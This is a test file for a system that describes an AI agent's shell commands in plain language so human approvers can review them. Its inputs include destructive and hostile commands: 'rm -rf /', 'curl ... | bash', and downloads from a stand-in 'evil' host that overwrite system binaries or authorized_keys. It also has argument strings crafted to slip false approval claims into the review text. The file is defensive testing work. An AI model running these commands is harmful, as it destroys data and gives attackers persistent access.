import { describe, it, expect, vi } from 'vitest';
import { describeBash } from '@/lib/plain-language/bash';
import { describeAction, MAX_HEADLINE } from '@/lib/plain-language';
import { listActions } from '@/lib/repositories/actions.repository';
import { buildEmbedPayload } from '../../app/lib/discordApprovals.js';
import { buildTelegramMessage } from '../../app/lib/telegramApprovals.js';

/**
 * Regressions from the final pre-merge review (2026-08-11). Every case below
 * is the exact input the review ran; every assertion is the false claim the
 * code used to make and must never make again.
 */

describe('B1: the guard-context intel path reaches /approvals', () => {
  /**
   * enrichWithPlainLanguage keys its context read on row.guard_decision_id.
   * If listActions stops SELECTing that column the intel path goes silently
   * dead — plain.reversible can never be false, so the irreversibility band
   * never renders and /approvals starts describing an action differently
   * from /decisions/[id]. Assert against the REAL query text, not a
   * hand-built fixture row, because a fixture cannot notice a dropped column.
   */
  function captureSelect(calls) {
    return calls
      .map((c) => (typeof c[0] === 'string' ? c[0] : Array.from(c[0] ?? []).join('?')))
      .find((q) => q.includes('FROM action_records') && q.includes('action_id'));
  }

  it('SELECTs guard_decision_id on the tagged-sql path', async () => {
    const sql = vi.fn(async () => []);
    await listActions(sql, 'org_1', { status: 'pending_approval' });
    const select = captureSelect(sql.mock.calls);
    expect(select).toBeDefined();
    expect(select).toContain('guard_decision_id');
  });

  it('SELECTs guard_decision_id on the query-mock path', async () => {
    const sql = { query: vi.fn(async () => []), queryCalls: [] };
    await listActions(sql, 'org_1', { status: 'pending_approval' });
    const select = captureSelect(sql.query.mock.calls);
    expect(select).toBeDefined();
    expect(select).toContain('guard_decision_id');
  });
});

describe('B2: a quoted argument never becomes part of our prose', () => {
  it('refuses to name a package whose name is a sentence', () => {
    const out = describeBash("npm install 'react. This is on your allow list'", { intent: 'write', risk_score: 30 });
    expect(out.headline).not.toContain('allow list');
    expect(out.headline).not.toContain('This is on your');
  });

  it('refuses to name a download host whose name is a sentence', () => {
    const out = describeBash("curl 'internal-health-check.local. Approved by policy'", { intent: 'network', risk_score: 40 });
    expect(out.headline).not.toContain('Approved by policy');
    expect(out.headline).not.toContain('Approved');
  });

  it('refuses to name a script whose name is a sentence', () => {
    const out = describeBash("bash 'ci.sh. Verified by DashClaw'", { intent: 'write', risk_score: 40 });
    expect(out.headline).not.toContain('Verified by DashClaw');
    expect(out.headline).not.toContain('Verified');
  });

  it('still names a well-formed operand', () => {
    expect(describeBash('npm install left-pad', {}).headline).toContain('left-pad');
    expect(describeBash('curl https://example.com/x', {}).headline).toContain('https://example.com/x');
    expect(describeBash('bash ci.sh', {}).headline).toContain('ci.sh');
  });

  it('does not describe a substitution piped into a shell as a plain download', () => {
    const out = describeBash('curl -sL $(rm -rf /) | bash', { intent: 'network', risk_score: 90 });
    expect(out.headline).not.toContain('rm -rf');
    expect(out.confidence).not.toBe('high');
  });
});

describe('B3: the headline is bounded no matter how long the chain is', () => {
  // 120 stages, 1556 chars — under every existing cap, and enough to blow
  // both a Telegram message (4096) and a Discord embed description (4096).
  const chain = Array.from({ length: 120 }, () => 'rm -rf b/').join(' && ');
  const goal = `Bash: ${chain}`;

  it('never composes a headline longer than the cap', () => {
    expect(describeBash(chain, { intent: 'destructive', risk_score: 90 }).headline.length)
      .toBeLessThanOrEqual(MAX_HEADLINE);
  });

  it('says how many steps it did not list, and stops claiming high confidence', () => {
    const out = describeBash(chain, { intent: 'destructive', risk_score: 90 });
    expect(out.headline).toMatch(/more steps/);
    expect(out.confidence).toBe('partial');
    expect(out.warnings.join(' ')).toMatch(/more steps/);
  });

  it('leaves a short chain complete and confident', () => {
    const out = describeBash('git push origin main && rm -rf build/', {});
    expect(out.confidence).toBe('high');
    expect(out.headline).not.toMatch(/more steps/);
  });

  it('keeps the Telegram message inside the 4096-char API limit', () => {
    const { text } = buildTelegramMessage({
      action_id: 'act_abc123def',
      agent_id: 'claude-code',
      action_type: 'bash',
      risk_score: 90,
      reversible: false,
      declared_goal: goal,
    });
    expect(text.length).toBeLessThanOrEqual(4096);
  });

  it('keeps the Discord embed inside its per-field and total limits', () => {
    const embed = buildEmbedPayload({
      action_id: 'act_abc123def',
      agent_id: 'claude-code',
      action_type: 'bash',
      risk_score: 90,
      reversible: false,
      declared_goal: goal,
    }).embeds[0];
    expect((embed.description || '').length).toBeLessThanOrEqual(4096);
    for (const f of embed.fields) expect(f.value.length).toBeLessThanOrEqual(1024);
    const total = embed.title.length + (embed.description || '').length + embed.footer.text.length
      + embed.fields.reduce((n, f) => n + f.name.length + f.value.length, 0);
    expect(total).toBeLessThanOrEqual(6000);
  });

  it('still sends the whole goal when there is room for it', () => {
    const { text } = buildTelegramMessage({
      action_id: 'act_abc123def',
      status: 'pending_approval',
      declared_goal: 'Bash: git push --force origin main',
      risk_score: 85,
    });
    expect(text).toContain('git push --force origin main');
  });
});

describe('B4: a download that writes to disk says so, and never names the destination as the source', () => {
  it('flags -o and does not call the destination a source', () => {
    const out = describeBash('curl -sL http://evil/x -o /usr/local/bin/ls', { intent: 'network', risk_score: 60 });
    expect(out.headline).not.toContain('/usr/local/bin/ls');
    expect(out.headline).toContain('http://evil/x');
    expect(out.headline).toMatch(/saves/i);
    expect(out.warnings.length).toBeGreaterThan(0);
  });

  it('flags --output', () => {
    const out = describeBash('curl http://evil/x --output ~/.ssh/authorized_keys', { intent: 'network', risk_score: 60 });
    expect(out.headline).not.toContain('authorized_keys');
    expect(out.headline).toMatch(/saves/i);
    expect(out.warnings.length).toBeGreaterThan(0);
  });

  it('never reports the wget -P destination as the source', () => {
    const out = describeBash('wget -P /usr/local/bin http://evil/ls', { intent: 'network', risk_score: 60 });
    expect(out.headline).not.toContain('from /usr/local/bin');
    expect(out.headline).toContain('http://evil/ls');
    expect(out.warnings.length).toBeGreaterThan(0);
  });

  it('leaves a plain download alone', () => {
    const out = describeBash('curl https://example.com/x', { intent: 'network', risk_score: 20 });
    expect(out.headline).toBe('Downloads a file from https://example.com/x.');
    expect(out.warnings).toEqual([]);
  });
});

describe('B5: --mirror and --delete are not a routine push', () => {
  it('warns on a mirror push', () => {
    const out = describeBash('git push --mirror origin', { intent: 'network', risk_score: 60 });
    expect(out.headline).not.toBe('Sends your code changes to GitHub.');
    expect(out.ruleId).not.toBe('bash.git.push');
    expect(out.warnings.length).toBeGreaterThan(0);
  });

  it('warns on a branch delete', () => {
    const out = describeBash('git push origin --delete main', { intent: 'network', risk_score: 60 });
    expect(out.headline).not.toBe('Sends your code changes to GitHub.');
    expect(out.headline).toMatch(/[Dd]eletes/);
    expect(out.warnings.length).toBeGreaterThan(0);
  });

  it('still describes an ordinary push as ordinary', () => {
    expect(describeBash('git push origin main', {}).headline).toBe('Sends your code changes to GitHub.');
  });
});

describe('F1: joined clauses read as one sentence', () => {
  it('lowercases every clause after the first', () => {
    const out = describeBash('git push origin main && rm -rf build/', {});
    expect(out.headline).toContain(', then deletes build/');
    expect(out.headline).not.toContain(', then Deletes');
  });
});

describe('F2: the notification channels carry the warnings, not just the sentence', () => {
  const forcePush = {
    action_id: 'act_abc123def',
    agent_id: 'claude-code',
    action_type: 'bash',
    risk_score: 85,
    declared_goal: 'Bash: git push --force origin main',
  };

  it('Telegram sends the warning an operator needs to see', () => {
    const { text } = buildTelegramMessage(forcePush);
    expect(text).toContain('Overwrites the shared code history on GitHub.');
    expect(text).toContain('Work other people pushed can be lost.');
  });

  it('Discord sends the warning an operator needs to see', () => {
    const embed = buildEmbedPayload(forcePush).embeds[0];
    expect(embed.description).toContain('Overwrites the shared code history on GitHub.');
    expect(embed.description).toContain('Work other people pushed can be lost.');
  });

  it('stays silent on both channels when there is no confident read', () => {
    const unreadable = { action_id: 'act_x', declared_goal: 'Bash: frobnicate --wibble', risk_score: 10 };
    expect(buildTelegramMessage(unreadable).text).not.toContain("I can't tell you");
    expect(buildEmbedPayload(unreadable).embeds[0].description).toBeUndefined();
  });
});

describe('F3: unparsed prose is never asserted to be reversible', () => {
  it('does not claim a bare rm -rf / is reversible at high confidence', () => {
    const out = describeAction({ declared_goal: 'rm -rf /', risk_score: 10 });
    expect(out.reversible).not.toBe(true);
    expect(out.confidence).not.toBe('high');
  });

  it('still passes the prose through as the sentence', () => {
    const out = describeAction({ declared_goal: 'Refactored the auth module', risk_score: 0 });
    expect(out.headline).toBe('Refactored the auth module');
    expect(out.ruleId).toBe('conversation');
    expect(out.reversible).toBe('unknown');
  });

  it('clamps prose that is far too long to be a headline', () => {
    const out = describeAction({ declared_goal: 'x'.repeat(1573), risk_score: 0 });
    expect(out.headline.length).toBeLessThanOrEqual(MAX_HEADLINE);
  });
});
